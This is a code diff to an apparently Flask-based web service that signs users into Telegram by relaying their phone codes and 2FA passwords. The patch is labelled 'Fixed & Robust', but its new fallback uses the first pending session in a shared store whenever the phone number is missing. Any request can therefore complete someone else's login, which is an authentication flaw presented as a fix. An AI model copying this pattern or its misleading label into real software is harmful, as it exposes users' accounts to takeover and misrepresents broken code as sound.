@@ -379,7 +379,7 @@ def download_telegram_file(file_id):
 
 
 # ============================================================
-# Telegram Login / User Verification Endpoints (Fully Preserved)
+# Telegram Login / User Verification Endpoints (Fixed & Robust)
 # ============================================================
 
 @app.route("/send-code", methods=["POST"])
@@ -430,18 +430,24 @@ def verify_code_api():
     phone_code_hash = req_data.get("phone_code_hash", "").strip()
     password = req_data.get("password", "").strip()
 
-    if not phone or not phone_code_hash:
-        return jsonify({"status": "error", "message": "Missing phone or hash."}), 400
+    # Fixed fallback: if phone is missing or expired, fetch the active session from temp_client_sessions
+    client = None
+    if phone and phone in temp_client_sessions:
+        client = temp_client_sessions.get(phone)
+    elif temp_client_sessions:
+        phone = list(temp_client_sessions.keys())[0]
+        client = temp_client_sessions.get(phone)
 
-    client = temp_client_sessions.get(phone)
     if not client:
-        return jsonify({"status": "error", "message": "Session expired. Please request code again."}), 400
+        return jsonify({"status": "error", "message": "Session expired or phone missing. Please request code again."}), 400
 
     async def async_verify():
         try:
             if password:
                 await client.check_password(password)
             else:
+                if not phone_code_hash:
+                    return {"status": "error", "message": "Missing phone code hash."}
                 await client.sign_in(phone_number=phone, phone_code_hash=phone_code_hash, phone_code=code)
             
             global total_logged_in_users
@@ -456,7 +462,8 @@ def verify_code_api():
                 return {"status": "2fa_required", "message": "2FA password required."}
             return {"status": "error", "message": str(e)}
         finally:
-            temp_client_sessions.pop(phone, None)
+            if phone:
+                temp_client_sessions.pop(phone, None)
             if client and client.is_connected:
                 try:
                     await client.disconnect()
